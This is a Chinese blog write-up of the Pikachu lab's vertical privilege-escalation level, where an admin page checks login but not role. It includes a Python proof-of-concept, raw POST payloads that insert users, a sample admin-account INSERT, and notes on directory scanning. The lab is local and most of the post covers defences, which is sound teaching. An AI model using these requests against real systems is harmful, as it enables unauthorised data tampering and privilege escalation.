---
layout: post
title: Pikachu - Over Permission 垂直越权 Writeup（漏一个 if 就是越权）
platform: pikachu
date: 2026-10-29 20:33:00 +0800
categories: CTF
---

Pikachu - Over Permission 垂直越权 Writeup（漏一个 if 就是越权）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Over Permission → 垂直越权
- 地址：`http://localhost/pikachu/vul/overpermission/op2/op2_login.php`
- 题型：Web
- 考点：**垂直越权**、认证与授权的分离、越权的典型成因

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu（users 表 + member 表）
```

**作者提示**：

| 页面 | 提示 |
|---|---|
| 登录页 | `这里有两个用户admin/123456,pikachu/000000,admin是超级boss` |
| 管理员页 | `想知道当超级boss是什么滋味吗` |

**`users` 表**：

```sql
id  username  password(前10位)  level
1   admin     e10adc3949        1      ← 超级 boss（admin/123456）
2   pikachu   670b14728a        2      ← 普通用户（pikachu/000000）
3   test      e99a18c428        3
```

**✅ 实测结果（4 步）**

| 步骤 | 请求 | 结果 |
|---|---|---|
| ① 用 `pikachu/000000` 登录（level 2）| POST `op2_login.php` | **302 → `op2_user.php`**（普通用户页面）✅ 登录成功 |
| ② 访问 `op2_admin.php` | GET | **302 → `op2_login.php`** ✅ **被挡住了** |
| ③ 访问 `op2_admin_edit.php` | GET | **HTTP 200**，页面含 `<input type="text" name="username">` ❌ **能访问！** |
| ④ 向 `op2_admin_edit.php` 提交新增用户 | POST | **302 → `op2_admin.php`** ✅ **执行了** |

**★ 第 ④ 步的数据库证据**：

```sql
id  username    sex   phonenum      email          address
28  op2_hacked  boy   13800000000   hack@evil.com  created-by-vertical-privesc
```

**★ 一个 level=2 的普通用户，成功在 `member` 表插入了新用户。**

**★ 测试数据已删除**（`DELETE FROM member WHERE username='op2_hacked'`），member 表恢复 7 个用户。

二、题目分析

**① ⭐ 水平越权 vs 垂直越权**

| | **水平越权**（上一关）| **垂直越权**（本关）|
|---|---|---|
| 攻击者身份 | 普通用户 | **普通用户** |
| 攻击目标 | 另一个**普通用户**的数据 | **管理员**的功能 |
| 方向 | **横向**（同级之间）| **纵向**（向上升级）|
| 手段 | 改 ID 参数（username / id）| **直接访问管理员接口** |
| 漏洞成因 | 身份来自客户端参数 | **漏了角色检查** |
| 危害 | 信息泄露 | **数据篡改 / 权限提升** |
| 危险程度 | 中高危 | **高危** |

**★ 一句话**：

```
水平越权 = "我能看你的"（平级）
垂直越权 = "我能干管理员的活"（越级）
★ 后者更危险 —— 因为它通向"完全控制"
```

**② 登录时：level 被存进了 session**

```php
<?php
// op2_login.php 第 28-43 行
$query = "select * from users where username='$username' and password=md5('$password')";
$result = execute($link, $query);
if(mysqli_num_rows($result) == 1){
    $data = mysqli_fetch_assoc($result);

    if($data['level'] == 1){                    // 超级管理员
        $_SESSION['op2']['username'] = $username;
        $_SESSION['op2']['password'] = sha1(md5($password));
        $_SESSION['op2']['level']    = 1;       // ★ level = 1
        header("location:op2_admin.php");
    }

    if($data['level'] == 2){                    // 普通用户
        $_SESSION['op2']['username'] = $username;
        $_SESSION['op2']['password'] = sha1(md5($password));
        $_SESSION['op2']['level']    = 2;       // ★ level = 2
        header("location:op2_user.php");
    }
}
?>
```

**★ 设计是对的**：

```
· 登录时从数据库读 level
· 存进 session（服务端，客户端改不了）
· 按 level 导向不同页面
★ 这一步没有问题
```

**③ 关键：`check_op2_login()` 只验证"登录"，不验证"角色"**

```php
<?php
// inc/function.php
function check_op2_login($link){
    if(isset($_SESSION['op2']['username']) && isset($_SESSION['op2']['password'])){
        $query = "select * from users where username='{$_SESSION['op2']['username']}'
                  and sha1(password)='{$_SESSION['op2']['password']}'";
        $result = execute($link, $query);
        if(mysqli_num_rows($result) == 1){
            return true;        // ★ 只验证"这个用户存在且密码对"
        }else{
            return false;
        }
    }else{
        return false;
    }
}
?>
```

**★ 它【完全不看 level】**：

```
check_op2_login() 返回 true
    → 只说明"你是一个合法登录的用户"
    → 不说明"你是管理员"
★ 所以"角色检查"必须【每个页面自己加】
```

**④ 两个管理员页面：一个加了，一个漏了**

**✅ `op2_admin.php`（有检查）**：

```php
<?php
// 第 22-26 行
//如果没登录，或者level不等于1，都就干掉
if(!check_op2_login($link) || $_SESSION['op2']['level'] != 1){
    header("location:op2_login.php");
    exit();
}

// 删除用户（危险操作）
if(isset($_GET['id'])){
    $id = escape($link, $_GET['id']);
    $query = "delete from member where id={$id}";
    execute($link, $query);
}
?>
```

**★ 这个页面写对了**：

```
check_op2_login($link)            → 登录了吗？
|| $_SESSION['op2']['level'] != 1  → ★ 是 level 1 吗？
```

**❌ `op2_admin_edit.php`（漏了检查）**：

```php
<?php
// 第 21-25 行
//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
if(!check_op2_login($link)){        // ★ 只检查登录！
    header("location:op2_login.php");
    exit();
}

// 新增用户（危险操作）
if(isset($_POST['submit'])){
    if($_POST['username'] != null && $_POST['password'] != null){
        $getdata = escape($link, $_POST);
        $query = "insert into member(username,pw,sex,phonenum,email,address)
                  values('{$getdata['username']}',md5('{$getdata['password']}'),
                         '{$getdata['sex']}','{$getdata['phonenum']}',
                         '{$getdata['email']}','{$getdata['address']}')";
        execute($link, $query);
        if(mysqli_affected_rows($link) == 1){
            header("location:op2_admin.php");
        }
    }
}
?>
```

**★ 作者的注释直接点破了**：

```
"这里只是验证了登录状态，并没有验证级别，所以存在越权问题。"
```

**⑤ ⭐ 为什么"漏一个 if"就是越权（越权的典型成因）**

**★ 这不是"写错了"，而是"忘了写"**：

```
· check_op2_login() 是"公共函数"，所有页面都调用它
· 调用它只解决"认证"
· "授权"需要【每个页面】自己加一行判断
· 页面越多，越容易漏
```

**★ 一个直观的比喻**：

```
公司大楼：
    一楼大门：刷卡（check_op2_login）→ 所有员工都能进
    财务室：需要"财务权限"（level==1）→ 门口还有一道刷卡机
    仓库：需要"仓库权限"
    
★ 如果有人忘了给"仓库"装刷卡机
★ 结果：任何员工都能进仓库

本关：
    op2_admin.php      → 装了刷卡机（level 检查）
    op2_admin_edit.php → ★ 忘了装
```

**★ 越权漏洞的漏点往往是"边角接口"**：

| 接口类型 | 典型问题 |
|---|---|
| 列表页 | 检查了 |
| **编辑页** | **经常漏**（本关）|
| **删除接口** | 经常漏（直接 `?id=` 就删）|
| **导出功能** | 经常漏 |
| **上传功能** | 经常漏 |
| **AJAX / API 接口** | 经常漏（前端页面有按钮隐藏，但接口没鉴权）|
| 调试接口 | 经常漏 |

**★ 一个常见的"错误认知"**：

```html
<!-- 开发者以为：菜单里不显示，普通用户就进不去 -->
<?php if ($_SESSION['level'] == 1): ?>
    <li><a href="/admin/edit">新增用户</a></li>
<?php endif; ?>
```

**★ 问题**：

```
菜单里确实不显示
→ 但 /admin/edit 这个 URL 依然存在
→ 攻击者直接输入 URL 就能访问
★ "隐藏"不是"权限"
```

**⑥ 危害：从"数据篡改"到"权限提升"**

**★ 本关的实际危害**：

```sql
-- op2_admin_edit.php 插入的是 member 表
insert into member(username, pw, sex, phonenum, email, address) values(...)
```

```
· 普通用户能"新增会员"
· 可用于：批量注册垃圾账号、伪造会员数据、配合其它模块（如水平越权）
★ 属于"数据篡改"
```

**★ 潜在的更大危害**：

```
如果这个接口写的是 users 表（带 level 字段）
    insert into users(username, password, level) values('hacker', md5('123'), 1)
→ 造一个 level=1 的账号
→ 登录后就是超级 boss
★ 这就是"权限提升（Privilege Escalation）"
★ 从"普通用户"直接跳到"管理员"
```

**★ 一个真实的"提权链"示例**：

```
① 发现普通用户能访问 /admin/user/edit（垂直越权）
② 这个接口能"改用户的角色"（比如 POST role=admin）
③ 把自己的角色改成 admin
④ 重新登录 → 变成管理员
⑤ 完全控制后台
★ 这是 HW / 众测里最常见的"提权路径"
```

三、解题步骤

**第 1 步：用普通用户登录**

```text
① 打开 http://localhost/pikachu/vul/overpermission/op2/op2_login.php
② 输入：pikachu / 000000
        └──┬──┘  └──┬──┘
      普通用户   密码（level = 2）
③ 点 Login
④ 跳到 op2_user.php（普通用户页面）
```

**★ 此时如果登录 `admin/123456`（level 1）**，会跳到 `op2_admin.php`（管理员页面）。

**第 2 步：试管理员页面（被挡）**

**★ 地址栏访问**：

```
http://localhost/pikachu/vul/overpermission/op2/op2_admin.php
```

**★ 预期**：

```
瞬间被弹回 op2_login.php
★ 因为 op2_admin.php 有 level 检查
```

**★ 用 F12 网络面板能看到**：

```
Request:  GET /op2_admin.php   → 302 Found
Location: op2_login.php
```

**第 3 步：⭐ 试另一个管理员页面（能进）**

**★ 地址栏访问**：

```
http://localhost/pikachu/vul/overpermission/op2/op2_admin_edit.php
```

**★ 预期**：

```
直接打开了"新增用户"的页面（HTTP 200）
★ 因为 op2_admin_edit.php 漏了 level 检查
```

**★ 页面长这样**：

```
新增用户
用户:  [            ]  必填
密码:  [            ]  必填
性别:  [            ]
手机:  [            ]
邮箱:  [            ]
住址:  [            ]
[ submit ]
```

**第 4 步：⭐ 真的新增一个用户（验证危害）**

**★ 在页面上填**：

```
用户：hack_test
密码：123456
性别：boy
手机：13800000000
邮箱：hack@evil.com
住址：added-by-pikachu
```

**★ 点 submit**

**★ 结果**：

```
302 → op2_admin.php
★ 虽然最终又被弹回登录页（因为 op2_admin.php 有检查）
★ 但"插入"已经执行了
```

**★ 数据库验证**：

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root --default-character-set=utf8mb4 -e "use pikachu; select id,username,email,address from member where username='hack_test';"
```

**★ 能看到记录 → 越权成功。**

**★ 测完记得删**：

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root -e "use pikachu; DELETE FROM member WHERE username='hack_test';"
```

**第 5 步：用脚本一次性验证（可选）**

**★ 用 Python 更清楚**：

```python
import urllib.error, urllib.request, urllib.parse, http.cookiejar

BASE = "http://localhost/pikachu/vul/overpermission/op2"
jar = http.cookiejar.CookieJar()

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None

op = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(jar), NoRedirect()
)

def do(url, data=None):
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": "Mozilla/5.0",
        **({"Content-Type": "application/x-www-form-urlencoded"} if data else {})
    })
    try:
        with op.open(req, timeout=20) as r:
            return r.status, r.headers.get("Location"), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("Location"), e.read().decode()

# 1. 普通用户登录
body = urllib.parse.urlencode({"username":"pikachu","password":"000000","submit":"submit"}).encode()
print("登录:", do(BASE + "/op2_login.php", body)[:2])

# 2. 管理员页面（应该被挡）
print("op2_admin.php:", do(BASE + "/op2_admin.php")[:2])

# 3. 新增用户页面（★ 不该能访问）
print("op2_admin_edit.php:", do(BASE + "/op2_admin_edit.php")[:2])
```

**★ 实测输出**：

```
登录: (302, 'op2_user.php')
op2_admin.php: (302, 'op2_login.php')          ← 被挡
op2_admin_edit.php: (200, None)                ← ★ 能访问
```

**第 6 步：完整 payload 汇总**

```
// ========== 登录 ==========
POST /op2_login.php
username=pikachu&password=000000&submit=submit
→ 302 → op2_user.php（level 2）

// ========== 管理员页面（有防护）==========
GET /op2_admin.php
→ 302 → op2_login.php                    ❌ 被挡

// ========== 管理员页面（无防护）==========
GET /op2_admin_edit.php
→ 200 OK                                 ✅ 越权

// ========== 越权操作：新增用户 ==========
POST /op2_admin_edit.php
username=hack_test&password=123456&sex=boy&phonenum=13800000000&email=hack@evil.com&address=added-by-pikachu&submit=submit
→ 302 → op2_admin.php                    ✅ 插入成功
```

四、延伸知识

**① 越权的完整分类（三种）**

| 类型 | 定义 | 例子 | 危害 |
|---|---|---|---|
| **水平越权** | 同级用户互相访问 | lucy 看 vince 的信息 | 信息泄露 |
| **垂直越权** | 低权限访问高权限功能 | **pikachu 新增用户（本关）** | 数据篡改 / 提权 |
| **交叉越权** | 两种混合 | A 用户用管理员接口操作 B 用户 | 更复杂 |

**★ OWASP Top 10 2021 排名**：

```
A01:2021 - Broken Access Control
    ★ 越权类漏洞是"第一名"
    ★ 因为"几乎每个系统都有"，且"危害大"
```

**② 常见的"越权漏点"清单（渗透测试检查表）**

**★ 按功能分类**：

| 功能 | 常见问题 |
|---|---|
| **列表页** | 分页参数可改 → 看全部数据 |
| **详情页** | `?id=` 可改 → 看别人的 |
| **编辑页** | `?id=` 可改 → 改别人的 |
| **删除接口** | `?id=` 可改 → 删别人的 |
| **导出功能** | 导出范围可改 → 导出全库 |
| **上传功能** | 上传目录可改 → 覆盖他人文件 |
| **AJAX 接口** | 前端有按钮控制，**接口无鉴权** |
| **API 接口** | 缺 role 检查 |
| **管理后台菜单** | 菜单隐藏，但 URL 可直达 |
| **文件下载** | 文件名可改 → 下载他人文件 |

**★ 一个实用的检查方法**：

```
① 用普通用户登录
② 在页面上"点遍所有按钮"，记录所有请求（Burp 的 HTTP history）
③ 从记录里找出"管理员才该有的请求"
④ 用普通用户的 cookie 重放这些请求
⑤ 看响应是不是 200
★ 这一步能发现大部分垂直越权
```

**★ 另一个方法：目录扫描**

```
管理后台的 URL 往往有规律：
    /admin/  /manage/  /system/  /op2_admin*.php
★ 用 dirsearch / gobuster 扫，能发现"菜单里没有"的页面
★ 扫到之后，用普通用户 cookie 访问 → 看是否 200
```

**③ "前端隐藏"为什么不算权限**

**★ 三种错误的"权限控制"**：

**错误 1：菜单隐藏**

```html
<?php if ($_SESSION['level'] == 1): ?>
    <li><a href="/admin/edit">新增用户</a></li>
<?php endif; ?>
```
```
★ 菜单里不显示，但 URL 依然可访问
```

**错误 2：按钮 disabled**

```html
<button disabled>删除</button>
```
```
★ F12 把 disabled 属性删掉就能点
```

**错误 3：JS 校验**

```javascript
if (userLevel !== 1) { alert("无权限"); return; }
```
```
★ 删掉这段 JS / 直接发请求就能绕过
```

**★ 唯一正确的做法**：

```
在【服务端】对【每个请求】做权限判断
★ 而且最好是"默认拒绝"（deny by default）
```

**④ "deny by default"（默认拒绝）**

**★ 对比两种设计**：

**❌ 白名单式（本关的问题）**：

```php
// 每个页面自己决定"要不要检查"
if (!check_login()) die;
// ★ 忘了写 = 没有检查 = 越权
```

**✅ 默认拒绝（推荐）**：

```php
// 路由定义时声明"需要的权限"
$router->get('/admin/edit', 'AdminController@edit')
       ->middleware('auth')        // 必须登录
       ->middleware('role:1');     // ★ 必须是 level 1

// 没有 middleware 的路由 = 公开页面（显式声明）
$router->get('/login', 'AuthController@login')->public();
```

**★ 核心思想**：

```
不是"哪些页面需要检查"
而是"哪些页面【不需要】检查"
★ 后者是"白名单"，漏不掉
★ 前者是"黑名单"，一定会漏
```

**⑤ 真实世界的垂直越权案例**

**案例 1：某 OA 的"用户管理"**

```
普通员工能访问 /admin/user/list（菜单里没有，但 URL 可达）
→ 看到所有员工的手机号、身份证号
★ 典型垂直越权
```

**案例 2：某电商的"订单导出"**

```
GET /api/order/export?range=all
普通用户改 range=all → 导出全站订单
★ 参数未校验 + 无角色检查
```

**案例 3：某 SaaS 的"成员邀请"**

```
POST /api/team/invite  {"role": "admin"}
普通成员能邀请"管理员"进来
→ 或者能改自己的 role
★ 直接提权
```

**案例 4：某银行的"修改手机号"**

```
POST /api/user/update_phone
普通用户能改"任意用户"的手机号（uid 参数可控）
→ 改掉别人的手机号 → 重置别人的密码
★ 水平越权 → 账户接管
```

**★ 共同点**：

```
① 接口存在，但"没有角色检查"
② 或者"检查了，但检查的对象是客户端传来的参数"
③ 攻击者只需要"知道 URL"+"发包"
```

**⑥ 防御（四层）**

**❌ 本关的反面教材**：

```php
// op2_admin_edit.php
if(!check_op2_login($link)){        // ★ 只检查登录
    header("location:op2_login.php");
    exit();
}
```

**✅ 第 1 层：每个敏感操作都检查角色**

```php
// 最直接的修法
if(!check_op2_login($link) || $_SESSION['op2']['level'] != 1){
    header("location:op2_login.php");
    exit();
}
```

**★ 但这是"逐个修"，容易再漏。**

**✅ 第 2 层：封装成"管理页专用"的检查函数**

```php
function require_admin($link){
    if(!check_op2_login($link) || $_SESSION['op2']['level'] != 1){
        header("location:op2_login.php");
        exit();
    }
}

// 每个管理员页面第一行
require_admin($link);
```

**★ 好处**：

```
· 一行搞定
· 不会"忘记加 level 判断"
· 但要靠"开发者记得调用"
```

**✅ 第 3 层：统一入口（路由 + 中间件）**

```php
// 所有 /admin/* 的请求都走同一个入口
if (str_starts_with($path, '/admin/')) {
    require_admin($link);        // ★ 统一检查，漏不掉
}
```

**★ 这是"默认拒绝"的实现**：

```
不需要"每个页面记得检查"
只需要"入口统一检查"
★ 漏点从"页面级"降到"入口级"（只有一处）
```

**✅ 第 4 层：最小权限 + 审计**

```sql
-- 数据库用户只给必要权限
GRANT SELECT, INSERT ON pikachu.* TO 'webuser'@'localhost';
-- ★ 不给 DROP / DELETE / UPDATE（如果不需要）

-- 记录"敏感操作"的审计日志
INSERT INTO audit_log(uid, action, target, time) VALUES(...)
```

**★ 好处**：

```
即使越权成功，破坏面也被限制
而且有日志可追溯
```

**⑦ 本模块两关的完整对比**

| | 水平越权 | **垂直越权** |
|---|---|---|
| 起点 | lucy（普通用户）| **pikachu（普通用户）** |
| 目标 | vince（另一普通用户）| **管理员的新增用户功能** |
| 手段 | 改 `username` 参数 | **直接访问 `op2_admin_edit.php`** |
| 漏洞代码 | 身份来自 `$_GET` | **漏了 `level != 1`** |
| 危害 | 个人信息泄露 | **数据篡改 / 潜在提权** |
| 修补 | 校验"对象归属" | **校验"角色权限"** |
| 检测方法 | 双账号对比 ID | **用普通用户访问管理员 URL** |

**★ 一句话**：

```
水平越权：改"对象"（看别人的）
垂直越权：改"身份"（干管理员的活）
```

五、总结

- **本题核心：`op2_admin_edit.php` 只调用了 `check_op2_login()`（验证登录），漏了 `$_SESSION['op2']['level'] != 1`（验证角色）→ 普通用户能访问管理员的新增用户功能。**

- **两段对比代码**：

```php
// ✅ op2_admin.php（写对了）
if(!check_op2_login($link) || $_SESSION['op2']['level'] != 1){
    header("location:op2_login.php");
    exit();
}
```

```php
// ❌ op2_admin_edit.php（漏了）
//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
if(!check_op2_login($link)){        // ★ 只检查登录！
    header("location:op2_login.php");
    exit();
}
```

- **⭐ 八个必记要点**：

```text
① 垂直越权 = 低权限用户干高权限的活
   本关：level 2 的 pikachu 访问管理员的新增用户页面

② check_op2_login() 只做"认证"，不做"授权"
   它验证"你登录了"
   不验证"你是管理员"
   ★ 所以每个管理员页面都要自己加 level 检查

③ 漏一个 if 就是越权
   op2_admin.php 加了 → 被挡（302）
   op2_admin_edit.php 漏了 → 能进（200）
   ★ 越权的成因往往不是"写错"，而是"忘了写"

④ 隐藏菜单 ≠ 权限
   前端不显示"新增用户"按钮
   但 URL 依然可访问
   ★ 攻击者直接输 URL 就行

⑤ 危害可升级
   本关：新增会员（数据篡改）
   如果接口能写 users.level → 直接提权成管理员

⑥ 检测方法：用普通用户 cookie 重放"管理员请求"
   在 Burp 里找出所有"管理员才该有的请求"
   用普通用户身份重放 → 看是不是 200

⑦ 防御要用"默认拒绝"
   不是"哪些页面需要检查"（会漏）
   而是"哪些页面不需要检查"（白名单）

⑧ 越权是 OWASP Top 10 第 1 名
   A01:2021 - Broken Access Control
   ★ 因为"几乎每个系统都有"，且危害大
```

- **实测数据**：

```text
pikachu/000000 登录          → 302 → op2_user.php（level 2）
GET op2_admin.php            → 302 → op2_login.php      ✅ 被挡
GET op2_admin_edit.php       → 200 OK                    ❌ 越权
POST op2_admin_edit.php      → 302 → op2_admin.php       ✅ 插入成功

数据库：
    id=28 | op2_hacked | boy | 13800000000 | hack@evil.com | created-by-vertical-privesc
（测试后已删除，member 表恢复 7 个用户）
```

- **进度**：

```text
platform: pikachu   36 篇（本地 102 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
└── Over Permission     2/2    ✅  ← 刚收官（水平 + 垂直）
```

**手工复现要点**：

```text
· pikachu/000000 登录 → 跳到 op2_user.php
· 访问 op2_admin.php → 被弹回登录页（有 level 检查）
· 访问 op2_admin_edit.php → 直接打开（漏了检查）
· 填表提交 → 数据库多一条记录
· 查库确认 → DELETE 清理
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  垂直越权 = "漏一个 if"                                        │
│                                                            │
│  认证：check_op2_login()          → 你登录了吗？               │
│  授权：$_SESSION['level'] != 1    → 你是管理员吗？             │
│                                                            │
│  ★ 授权检查必须每个管理员页面自己加                             │
│  ★ 漏一个页面 = 一条越权路径                                   │
│                                                            │
│  ★ 隐藏菜单 ≠ 权限（URL 可直达）                               │
│  ★ 危害可升级：写 users.level → 提权成管理员                    │
│  ★ 防御：默认拒绝 + 统一中间件（而不是"逐个页面记得加"）           │
└────────────────────────────────────────────────────────────┘
```
